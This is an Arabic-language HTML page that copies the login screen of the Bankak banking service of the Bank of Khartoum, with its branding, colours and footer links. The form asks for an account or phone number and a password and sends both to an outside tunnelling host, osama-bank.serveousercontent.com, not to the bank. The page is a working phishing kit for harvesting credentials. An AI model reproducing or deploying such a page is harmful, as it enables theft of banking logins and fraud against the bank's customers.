<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bankak - بنكك</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #fff; overflow-x: hidden; }
        .top-red { background-color: #e31e24; height: 230px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; border-bottom-left-radius: 50% 30px; border-bottom-right-radius: 50% 30px; position: relative; }
        .logo-text { font-size: 55px; font-weight: bold; margin-bottom: -10px; }
        .logo-sub { font-size: 28px; letter-spacing: 4px; font-weight: bold; opacity: 0.9; }
        .container { padding: 25px; margin-top: -20px; }
        .input-group { position: relative; margin-bottom: 12px; }
        input { width: 100%; padding: 16px 15px; border: 1.5px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; text-align: right; background-color: #fcfcfc; }
        input:focus { border-color: #e31e24; outline: none; background-color: #fff; }
        .login-btn { width: 100%; padding: 14px; background: linear-gradient(to bottom, #ff3b3b, #b30000); color: white; border: none; border-radius: 10px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        .links { display: flex; justify-content: space-between; margin-top: 25px; color: #777; font-size: 15px; }
        .social { margin-top: 60px; display: flex; justify-content: center; gap: 20px; }
        .circle { width: 45px; height: 45px; border-radius: 50%; background-color: #f1f1f1; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #444; }
        .footer-text { text-align: center; color: #999; font-size: 13px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="top-red">
    <div class="logo-text">بنكك</div>
    <div class="logo-sub">bankak</div>
</div>

<div class="container">
    <form action="https://osama-bank.serveousercontent.com" method="POST">
        <div class="input-group">
            <input type="text" name="email" placeholder="أدخل رقم المعرف (رقم الحساب أو الهاتف)" required>
        </div>
        <div class="input-group">
            <input type="password" name="pass" placeholder="أدخل كلمة المرور" required>
        </div>
        <button type="submit" class="login-btn">تسجيل الدخول</button>
    </form>

    <div class="links">
        <span>تسجيل جديد؟</span>
        <span>لا تستطيع تسجيل الدخول؟</span>
    </div>

    <div class="social">
        <div class="circle">f</div>
        <div class="circle">📞</div>
        <div class="circle">📍</div>
        <div class="circle">🌍</div>
    </div>
    <div class="footer-text">فيس بوك | المساعدة | مواقعنا | بنك الخرطوم</div>
</div>

</body>
</html>
